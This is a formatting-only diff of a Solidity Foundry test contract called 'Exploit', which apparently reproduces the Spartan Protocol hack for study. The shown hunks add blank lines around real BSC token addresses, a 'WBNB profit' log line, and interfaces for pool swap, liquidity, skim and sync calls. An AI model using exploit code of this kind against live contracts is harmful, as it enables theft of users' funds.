@@ -14,6 +14,7 @@ import "forge-std/Test.sol";
 // https://rekt.news/spartan-rekt/
 
 contract Exploit is Test {
+
     IWBNB private constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 private constant SPARTA = IERC20(0xE4Ae305ebE1AbE663f261Bc00534067C80ad677C);
 
@@ -76,36 +77,45 @@ contract Exploit is Test {
 
         console.log("%s WBNB profit", WBNB.balanceOf(address(this)) / 1e18);
     }
+
 }
 
 /* ---------------------- Interface ---------------------- */
 interface ISpartanPool {
+
     function swapTo(address token, address member) external payable returns (uint256 outputAmount, uint256 fee);
     function addLiquidity() external returns (uint256 liquidityUnits);
     function removeLiquidity() external returns (uint256 outputBase, uint256 outputToken);
 
     function transfer(address to, uint256 amount) external returns (bool);
     function balanceOf(address account) external view returns (uint256);
+
 }
 
 interface IERC20 {
+
     function transfer(address to, uint256 amount) external returns (bool);
     function approve(address spender, uint256 amount) external returns (bool);
     function balanceOf(address account) external view returns (uint256);
     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+
 }
 
 interface IWBNB {
+
     function deposit() external payable;
     function transfer(address to, uint256 value) external returns (bool);
     function approve(address guy, uint256 wad) external returns (bool);
     function withdraw(uint256 wad) external;
     function balanceOf(address) external view returns (uint256);
+
 }
 
 interface IUniswapV2Pair {
+
     function balanceOf(address) external view returns (uint256);
     function skim(address to) external;
     function sync() external;
     function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
+
 }
